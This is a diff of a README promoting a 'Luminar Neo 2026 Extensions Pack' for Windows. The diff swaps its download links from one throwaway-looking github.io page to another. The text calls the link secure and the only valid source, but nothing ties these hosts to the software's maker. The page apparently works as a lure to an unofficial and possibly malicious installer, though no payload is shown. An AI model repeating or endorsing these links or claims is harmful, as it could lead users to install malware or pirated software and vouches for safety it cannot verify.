@@ -2,7 +2,7 @@
 
 Luminar Neo 2026 Extensions Pack is a comprehensive desktop tool designed to supercharge your photo editing workflow on Windows. Leveraging advanced AI technology, this pack offers a suite of extensions and presets that make professional-grade enhancements accessible to both beginners and experts. If you're looking to unlock the full potential of Luminar Neo with features like AI sky replacement, curated presets, and seamless integration, this extensions pack is your go-to solution for 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 Before diving in, ensure your system meets the following minimum requirements for optimal performance on Windows 10 or 11:
@@ -67,7 +67,7 @@ A: Updates are automatically checked when you launch Luminar Neo. You’ll recei
 ## Download
 Ready to enhance your photo editing experience? Get the latest version of the Luminar Neo 2026 Extensions Pack directly from our GitHub page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link leads to a secure download page where you can find the installer and additional resources. Remember, the only valid download source is the provided link, ensuring you get a safe and up-to-date copy.
 
